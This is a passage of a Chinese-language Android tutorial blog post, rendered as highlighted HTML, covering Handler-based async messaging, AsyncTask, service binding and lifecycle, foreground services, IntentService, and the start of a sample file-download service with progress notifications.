<span class="hljs-title class_">Runnable</span>() &#123;<br>                    <span class="hljs-meta">@Override</span><br>                    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">run</span><span class="hljs-params">()</span> &#123;<br>                        <span class="hljs-comment">//利用消息处理进行子线程对UI修改</span><br>                        <span class="hljs-type">Message</span> <span class="hljs-variable">message</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Message</span>();<br>                        message.what = UPDATE_TEXT;<br>                        handler.sendMessage(message);<br>                    &#125;<br>                &#125;).start();<br>                <span class="hljs-keyword">break</span>;<br>                <span class="hljs-keyword">default</span>:<br>                    <span class="hljs-keyword">break</span>;<br>        &#125;<br><br>    &#125;<br></code></pre></td></tr></table></figure><h2 id="异步消息处理机制"><a href="#异步消息处理机制" class="headerlink" title="异步消息处理机制"></a>异步消息处理机制</h2><p><code>Android</code>中的异步消息处理由4部分组成：<code>Message</code>、<code>Handler</code>、<code>MessageQueue</code>、<code>Looper</code>。</p><ul><li><p><code>Message</code>：是线程之间传递的消息，用于在不同线程之间交换数据。</p></li><li><p><code>Handler</code>：是用于发送和处理消息的</p></li><li><p><code>MessageQueue</code>：消息队列，主要用于存放通过<code>Handle</code>发送的消息。这部分消息会一直存在于消息队列中，等待被处理。每个线程都有一个<code>MessageQueue</code>对象</p></li><li><p><code>Looper</code>：管理消息队列，每当发现队列中存在消息就会将消息取出，传递给<code>Handler</code>进行处理，每个线程都有一个<code>Looper</code>对象</p></li></ul><p><img src="https://github.com/h0pe-ay/picgo/raw/master/image-20220118172507399.png" alt="图片来自Android第一行代码"></p><h2 id="AsyncTask"><a href="#AsyncTask" class="headerlink" title="AsyncTask"></a>AsyncTask</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">class</span> <span class="hljs-title class_">DownloadTask</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AsyncTask</span>&lt;Void, Integer, Boolean&gt;<br>&#123;<br>    <span class="hljs-comment">///</span><br>&#125;<br></code></pre></td></tr></table></figure><p><code>AsyncTask</code>是一个抽象类，因此想要使用需要创建一个子类去继承它。<code>AsyncTask</code>类指定3个泛型参数</p><ul><li>参数一：<code>Params</code>，在执行<code>AsyncTask</code>时需要传入的参数，用于在后台任务中使用。</li><li>参数二：<code>Progress</code>，后台任务执行时，在界面显示当前的进度</li><li>参数三：<code>Result</code>，任务执行完毕后，如果需要对结果进行返回，则是要该泛型值进行返回。</li></ul><p><code>AsyncTask</code>需要重写的方法</p><ul><li><code>onPreExecute()</code>：该方法在后台任务开始执行前调用，用于界面上的初始化。</li><li><code>doInBackground(Params...)</code>:需要在线程运行的代码需要放在这个方法中，但是不能进行<code>UI</code>处理</li><li><code>onProgressUpdate(Progress...)</code>：这个方法可以对<code>UI</code>进行操作，参数通过<code>publishProgress(Progress...)</code>传递过来</li><li><code>onPostExecute(Result)</code>：后台任务执行完毕并通过<code>return</code>语句返回时会执行该方法</li></ul><h2 id="服务的基本用法"><a href="#服务的基本用法" class="headerlink" title="服务的基本用法"></a>服务的基本用法</h2><p><strong>启动服务</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Intent</span> <span class="hljs-variable">startIntent</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Intent</span>(<span class="hljs-built_in">this</span>,MyService.class);<br>startService(startIntent); <span class="hljs-comment">//启动服务</span><br></code></pre></td></tr></table></figure><p><strong>关闭服务</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">case</span> R.id.stop_service:<br>    <span class="hljs-type">Intent</span> <span class="hljs-variable">stopIntent</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Intent</span>(<span class="hljs-built_in">this</span>,MyService.class);<br>    stopService(stopIntent);<br></code></pre></td></tr></table></figure><h2 id="活动和服务进行通信"><a href="#活动和服务进行通信" class="headerlink" title="活动和服务进行通信"></a>活动和服务进行通信</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java">    <span class="hljs-keyword">private</span> <span class="hljs-type">DownloadBinder</span> <span class="hljs-variable">mBinder</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">DownloadBinder</span>(); <span class="hljs-comment">//建立Binder对象</span><br>    <span class="hljs-keyword">class</span> <span class="hljs-title class_">DownloadBinder</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Binder</span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">startDownload</span><span class="hljs-params">()</span>&#123;<br>            Log.d(<span class="hljs-string">&quot;MyService&quot;</span>, <span class="hljs-string">&quot;startDownload: &quot;</span>);<br>        &#125;<br>        <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getProgress</span><span class="hljs-params">()</span>&#123;<br>            Log.d(<span class="hljs-string">&quot;MyService&quot;</span>, <span class="hljs-string">&quot;getProgress: &quot;</span>);<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>        &#125;<br>    &#125;<br>...<br>        <span class="hljs-keyword">public</span> IBinder <span class="hljs-title function_">onBind</span><span class="hljs-params">(Intent intent)</span> &#123;<br>        <span class="hljs-comment">// <span class="hljs-doctag">TODO:</span> Return the communication channel to the service.</span><br>        <span class="hljs-keyword">return</span> mBinder;<br>    &#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs java">    <span class="hljs-keyword">private</span>  MyService.DownloadBinder downloadBinder;<span class="hljs-comment">//Binder对象</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-type">ServiceConnection</span> <span class="hljs-variable">connection</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ServiceConnection</span>() &#123;<br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onServiceConnected</span><span class="hljs-params">(ComponentName name, IBinder service)</span> &#123;<br>            downloadBinder = (MyService.DownloadBinder)service;<br>            downloadBinder.startDownload();<br>            downloadBinder.getProgress();<br>        &#125;<br><br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onServiceDisconnected</span><span class="hljs-params">(ComponentName name)</span> &#123;<br><br>        &#125;<br>    &#125;;<br>...<br>            <span class="hljs-keyword">case</span> R.id.bind_service:<br>                <span class="hljs-type">Intent</span> <span class="hljs-variable">bindIntent</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Intent</span>(<span class="hljs-built_in">this</span>,MyService.class);<br>                 bindService(bindIntent,connection,BIND_AUTO_CREATE);<br>                <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">case</span> R.id.unbind_service:<br>                unbindService(connection);<br>                <span class="hljs-keyword">break</span>;<br></code></pre></td></tr></table></figure><ul><li><code>bindService()</code>方法用于服务与活动建立连接<ul><li>参数一：<code>intent</code>对象</li><li>参数二：<code>Serviceconnect</code>实例</li><li>参数三：<code>BIND_AUTO_CREATE</code>表示在活动和服务进行绑定后自动创建服务</li></ul></li></ul><h2 id="服务的生命周期"><a href="#服务的生命周期" class="headerlink" title="服务的生命周期"></a>服务的生命周期</h2><ul><li><p>服务生命周期内可能回调的方法有<code>onCreate()</code>、<code>onStartCommand()</code>、<code>onBind()</code>、<code>onDestory()</code>。</p></li><li><p>当调用了<code>startService()</code>方法，相应的服务就会被启动且会回调<code>onStartCommand()</code>方法，若服务此前没有被调用则会调用<code>onCreate()</code>方法。<code>stopService()</code>和<code>stopSelf()</code>方法可以停止服务。</p></li><li><p><code>bindService()</code>方法用来获取服务的持久性连接，这时会回调<code>onBind()</code>方法，<code>onBind()</code>方法会返回<code>IBinder</code>对象的实例，使用<code>unbindService()</code>方法用于销毁服务。</p></li><li><p>当服务销毁时会回调<code>onDestory()</code></p></li></ul><h2 id="服务的更多技巧"><a href="#服务的更多技巧" class="headerlink" title="服务的更多技巧"></a>服务的更多技巧</h2><h3 id="前台服务"><a href="#前台服务" class="headerlink" title="前台服务"></a>前台服务</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Intent</span> <span class="hljs-variable">intent</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Intent</span>(<span class="hljs-built_in">this</span>,MainActivity.class);<br><span class="hljs-type">PendingIntent</span> <span class="hljs-variable">pi</span> <span class="hljs-operator">=</span> PendingIntent.getActivity(<span class="hljs-built_in">this</span>,<span class="hljs-number">0</span>,intent,<span class="hljs-number">0</span>);<br><span class="hljs-type">Notification</span> <span class="hljs-variable">notification</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">NotificationCompat</span>.Builder(<span class="hljs-built_in">this</span>)<br>        .setContentTitle(<span class="hljs-string">&quot;This is content title&quot;</span>)<br>        .setContentText(<span class="hljs-string">&quot;This is content Text&quot;</span>)<br>        .setWhen(System.currentTimeMillis())<br>        .setSmallIcon(R.mipmap.ic_launcher)<br>        .setLargeIcon(BitmapFactory.decodeResource(getResources(),R.mipmap.ic_launcher))<br>        .setContentIntent(pi)<br>        .build();<br>startForeground(<span class="hljs-number">1</span>,notification);<br></code></pre></td></tr></table></figure><ul><li><p><code>PendingIntent</code>是<code>Intent</code>的封装，满足某些条件或触发某些事件后执行指定的行为</p><ul><li>参数一：<code>Context</code>上下文</li><li>参数二：<code>requestCode</code>请求码</li><li>参数三：<code>Intent</code>意图</li><li>参数四：<code>flags</code></li></ul></li><li><p><code>Notification</code>是状态通知栏</p></li></ul><h3 id="IntentService"><a href="#IntentService" class="headerlink" title="IntentService"></a>IntentService</h3><p>由于服务中的代码都是默认在主线程当中运行，因此需要将处理耗时的逻辑放在子线程中处理。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">onStartCommand</span><span class="hljs-params">(Intent intent, <span class="hljs-type">int</span> flags, <span class="hljs-type">int</span> startId)</span> &#123;<br>    Log.d(<span class="hljs-string">&quot;MySerivce&quot;</span>,<span class="hljs-string">&quot;onStartCommand: &quot;</span>);<br>    <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Runnable</span>() &#123;<br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">run</span><span class="hljs-params">()</span> &#123;<br>            <span class="hljs-comment">//处理具体的逻辑</span><br>        &#125;<br>    &#125;).start();<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">super</span>.onStartCommand(intent, flags, startId);<br>&#125;<br></code></pre></td></tr></table></figure><p>服务一旦启动就会处于运行状态，因此需要在子线程中加上停止服务的操作</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">onStartCommand</span><span class="hljs-params">(Intent intent, <span class="hljs-type">int</span> flags, <span class="hljs-type">int</span> startId)</span> &#123;<br>    Log.d(<span class="hljs-string">&quot;MySerivce&quot;</span>,<span class="hljs-string">&quot;onStartCommand: &quot;</span>);<br>    <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Runnable</span>() &#123;<br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">run</span><span class="hljs-params">()</span> &#123;<br>            <span class="hljs-comment">//处理具体的逻辑</span><br>            stopSelf();<br>        &#125;<br>    &#125;).start();<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">super</span>.onStartCommand(intent, flags, startId);<br>&#125;<br></code></pre></td></tr></table></figure><p>防止程序员忘记启动线程或者在子线程中写停止服务的操作，<code>Android</code>提供了<code>IntentService</code>类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyIntentService</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">IntentService</span> &#123;<br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * Creates an IntentService.  Invoked by your subclass&#x27;s constructor.</span><br><span class="hljs-comment">     *</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> name Used to name the worker thread, important only for debugging.</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">MyIntentService</span><span class="hljs-params">(String name)</span> &#123;<br>        <span class="hljs-built_in">super</span>(name);<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-comment">//操作都在子线程中进行</span><br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onHandleIntent</span><span class="hljs-params">(<span class="hljs-meta">@Nullable</span> Intent intent)</span> &#123;<br>        Log.d(<span class="hljs-string">&quot;MyIntentService&quot;</span>, <span class="hljs-string">&quot;Thread id is  : &quot;</span>+Thread.currentThread().getId());<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onDestroy</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-built_in">super</span>.onDestroy();<br>        Log.d(<span class="hljs-string">&quot;MyIntentService&quot;</span>, <span class="hljs-string">&quot;onDestroy: &quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="服务的实践"><a href="#服务的实践" class="headerlink" title="服务的实践"></a>服务的实践</h2><h3 id="DownloadListener"><a href="#DownloadListener" class="headerlink" title="DownloadListener"></a>DownloadListener</h3><p><code>DownloadListener</code>接口用于下载操作</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">DownloadListener</span> &#123;<br>    <span class="hljs-keyword">void</span> <span class="hljs-title function_">onProgress</span><span class="hljs-params">(<span class="hljs-type">int</span> progress)</span>;<br>    <span class="hljs-keyword">void</span> <span class="hljs-title function_">onSuccess</span><span class="hljs-params">()</span>;<br>    <span class="hljs-keyword">void</span> <span class="hljs-title function_">onFailed</span><span class="hljs-params">()</span>;<br>    <span class="hljs-keyword">void</span> <span class="hljs-title function_">onPaused</span><span class="hljs-params">()</span>;<br>    <span class="hljs-keyword">void</span> <span class="hljs-title function_">onCanceled</span><span class="hljs-params">()</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="DownloadService"><a href="#DownloadService" class="headerlink" title="DownloadService"></a>DownloadService</h3><p>下载的服务,主要实现了接口的方法，以及活动与服务绑定时返回的<code>Binder</code>对象，以及消息通知栏的实现。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example.servicebestpractice;<br><br><span class="hljs-keyword">import</span> android.app.Notification;<br><span class="hljs-keyword">import</span> android.app.NotificationChannel;<br><span class="hljs-keyword">import</span> android.app.NotificationManager;<br><span class="hljs-keyword">import</span> android.app.PendingIntent;<br><span class="hljs-keyword">import</span> android.app.Service;<br><span class="hljs-keyword">import</span> android.content.Intent;<br><span class="hljs-keyword">import</span> android.graphics.BitmapFactory;<br><span class="hljs-keyword">import</span> android.graphics.Color;<br><span class="hljs-keyword">import</span> android.os.Binder;<br><span class="hljs-keyword">import</span> android.os.Environment;<br><span class="hljs-keyword">import</span> android.os.IBinder;<br><span class="hljs-keyword">import</span> android.widget.Toast;<br><br><span class="hljs-keyword">import</span> androidx.core.app.NotificationCompat;<br><br><span class="hljs-keyword">import</span> java.io.File;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DownloadService</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Service</span> &#123;<br>    <span class="hljs-keyword">private</span> DownloadTask downloadTask;<br><br>    <span class="hljs-keyword">private</span> String downloadUrl;<br>    <span class="hljs-comment">//对下载监听器实例化，并重写方法</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-type">DownloadListener</span> <span class="hljs-variable">listener</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">DownloadListener</span>() &#123;<br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onProgress</span><span class="hljs-params">(<span class="hljs-type">int</span> progress)</span> &#123;<br>            getNotificationManager().notify(<span class="hljs-number">1</span>, getNotification(<span class="hljs-string">&quot;Downloading...&quot;</span>, progress));<br>        &#125;<br><br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onSuccess</span><span class="hljs-params">()</span> &#123;<br>            downloadTask = <span class="hljs-literal">null</span>;<br>            <span class="hljs-comment">// 下载成功时将前台服务通知关闭，并创建一个下载成功的通知</span><br>            stopForeground(<span class="hljs-literal">true</span>);<br>            getNotificationManager().notify(<span class="hljs-number">1</span>, getNotification(<span class="hljs-string">&quot;Download Success&quot;</span>, -<span class="hljs-number">1</span>));<br>            Toast.makeText(DownloadService.<span class="hljs-built_in">this</span>, <span class="hljs-string">&quot;Download Success&quot;</span>, Toast.LENGTH_SHORT).show();<br>        &#125;<br><br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onFailed</span><span class="hljs-params">()</span> &#123;<br>            downloadTask = <span class="hljs-literal">null</span>;<br>            <span class="hljs-comment">// 下载失败时将前台服务通知关闭，并创建一个下载失败的通知</span><br>            stopForeground(<span class="hljs-literal">true</span>);<br>            getNotificationManager().notify(<span class="hljs-number">1</span>, getNotification(<span class="hljs-string">&quot;Download Failed&quot;</span>, -<span class="hljs-number">1</span>));<br>            Toast.makeText(DownloadService.<span class="hljs-built_in">this</span>, <span class="hljs-string">&quot;Download Failed&quot;</span>, Toast.LENGTH_SHORT).show();<br>        &#125;<br><br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onPaused</span><span class="hljs-params">()</span> &#123;<br>            downloadTask = <span class="hljs-literal">null</span>;<br>            Toast.makeText(DownloadService.<span class="hljs-built_in">this</span>, <span class="hljs-string">&quot;Paused&quot;</span>, Toast.LENGTH_SHORT).show();<br>        &#125;<br><br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onCanceled</span><span class="hljs-params">()</span> &#123;<br>            downloadTask = <span class="hljs-literal">null</span>;<br>            stopForeground(<span class="hljs-literal">true</span>);<br>            Toast.makeText(DownloadService.<span class="hljs-built_in">this</span>, <span class="hljs-string">&quot;Canceled&quot;</span>, Toast.LENGTH_SHORT).show();<br>        &#125;<br><br>    &#125;;<br>    <span class="hljs-comment">//完成绑定对象的实例化</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-type">DownloadBinder</span> <span class="hljs-variable">mBinder</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">DownloadBinder</span>();<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> IBinder <span class="hljs-title function_">onBind</span><span class="hljs-params">(Intent intent)</span> &#123;<br>        <span class="hljs-keyword">return</span> mBinder;<br>    &#125;<br><br>    <span class="hljs-keyword">class</span> <span class="hljs-title class_">DownloadBinder</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Binder</span> &#123;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">startDownload</span><span class="hljs-params">(String url)</span> &#123;<br>            <span class="hljs-comment">//downloadTask用于处理下载任务</span><br>            <span class="hljs-keyword">if</span> (downloadTask == <span class="hljs-literal">null</span>) &#123;<br>                downloadUrl = url;<br>                downloadTask = <span class="hljs-keyword">new</span> <span class="hljs-title class_">DownloadTask</span>(listener);<br>                <span class="hljs-comment">//将下载地址传入，并启动任务</span><br>                downloadTask.execute(downloadUrl);<br>                <span class="hljs-comment">//消息通知栏</span><br>                startForeground(<span class="hljs-number">1</span>, getNotification(<span class="hljs-string">&quot;Downloading...&quot;</span>, <span class="hljs-number">0</span>));<br>                Toast.makeText(DownloadService.<span class="hljs-built_in">this</span>, <span class="hljs-string">&quot;Downloading...&quot;</span>, Toast.LENGTH_SHORT).show();<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">pauseDownload</span><span class="hljs-params">()</span> &#123;<br>            <span class="hljs-keyword">if</span> (downloadTask != <span class="hljs-literal">null</span>) &#123;<br>                downloadTask.pauseDownload();<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">cancelDownload</span><span class="hljs-params">()</span> &#123;<br>            <span class="hljs-keyword">if</span> (downloadTask != <span class="hljs-literal">null</span>) &#123;<br>                downloadTask.cancelDownload();<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-keyword">if</span> (downloadUrl != <span class="hljs-literal">null</span>) &#123;<br>                    <span class="hljs-comment">// 取消下载时需将文件删除，并将通知关闭</span><br>                    <span class="hljs-type">String</span> <span class="hljs-variable">fileName</span> <span class="hljs-operator">=</span> downloadUrl.substring(downloadUrl.lastIndexOf(<span class="hljs-string">&quot;/&quot;</span>));<br>                    <span class="hljs-type">String</span> <span class="hljs-variable">directory</span> <span class="hljs-operator">=</span> Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS).getPath();<br>                    <span class="hljs-type">File</span> <span class="hljs-variable">file</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(directory + fileName);<br>                    <span class="hljs-keyword">if</span> (file.exists()) &#123;<br>                        file.delete();<br>                    &#125;<br>                    getNotificationManager().cancel(<span class="hljs-number">1</span>);<br>                    stopForeground(<span class="hljs-literal">true</span>);<br>                    Toast.makeText(DownloadService.<span class="hljs-built_in">this</span>, <span class="hljs-string">&quot;Canceled&quot;</span>, Toast.LENGTH_SHORT).show();<br>                &#125;<br>            &#125;<br>        &#125;<br><br>    &#125;<br><br>    <span class="hljs-keyword">private</span> NotificationManager <span class="hljs-title function_">getNotificationManager</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> (NotificationManager) getSystemService(NOTIFICATION_SERVICE);<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> Notification <span class="hljs-title function_">getNotification</span><span class="hljs-params">(String title, <span class="hljs-type">int</span> progress)</span> &#123;<br>        <span class="hljs-type">Intent</span> <span class="hljs-variable">intent</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Intent</span>(<span class="hljs-built_in">this</span>, MainActivity.class);<br>        <span class="hljs-type">PendingIntent</span> <span class="hljs-variable">pi</span> <span class="hljs-operator">=</span> PendingIntent.getActivity(<span class="hljs-built_in">this</span>, <span class="hljs-number">0</span>, intent, <span class="hljs-number">0</span>);<br>        NotificationCompat.<span class="hljs-type">Builder</span> <span class="hljs-variable">builder</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">NotificationCompat</span>.Builder(<span class="hljs-built_in">this</span>);<br>        builder.setSmallIcon(R.mipmap.ic_launcher);<br>        builder.setLargeIcon(BitmapFactory.decodeResource(getResources(), R.mipmap.ic_launcher));<br>        builder.setContentIntent(pi);<br>        builder.setContentTitle(title);<br>        <span class="hljs-keyword">if</span> (progress &gt;= <span class="hljs-number">0</span>) 